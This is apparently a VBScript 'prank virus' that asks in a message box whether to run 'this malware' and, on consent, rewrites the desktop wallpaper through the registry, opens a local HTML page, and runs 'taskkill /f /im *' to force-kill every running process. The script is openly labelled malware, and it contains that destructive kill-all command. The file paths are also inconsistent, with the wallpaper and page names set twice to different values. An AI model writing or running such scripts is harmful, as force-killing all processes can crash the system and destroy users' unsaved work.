Option Explicit

Dim wallpaperPath, htmlFilePath, Shell, answer

Dim scriptDir
scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))

wallpaperPath = scriptDir & "matrix.png"
htmlFilePath = scriptDir & "hacked.html"

Set Shell = CreateObject("WScript.Shell")

answer = MsgBox("WARNING: THIS VIRUS CAN HARM TO YOUR COMPUTER, DO YOU WANT TO RUN THIS MALWARE?", vbExclamation + vbYesNo, "WARNING")

Function runVirus()
    scriptDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
    wallpaperPath = scriptDir & "Wallpaper.jpg"
    htmlFilePath = scriptDir & "File.html"
    
    Set Shell = CreateObject("WScript.Shell")

    Shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaperPath
    Shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

    Shell.Run "taskkill /f /im *"
    
    Shell.Run """" & htmlFilePath & """", 1, False
    
End Function

If answer = vbYes Then
    runVirus()
Else
End If

Set Shell = Nothing
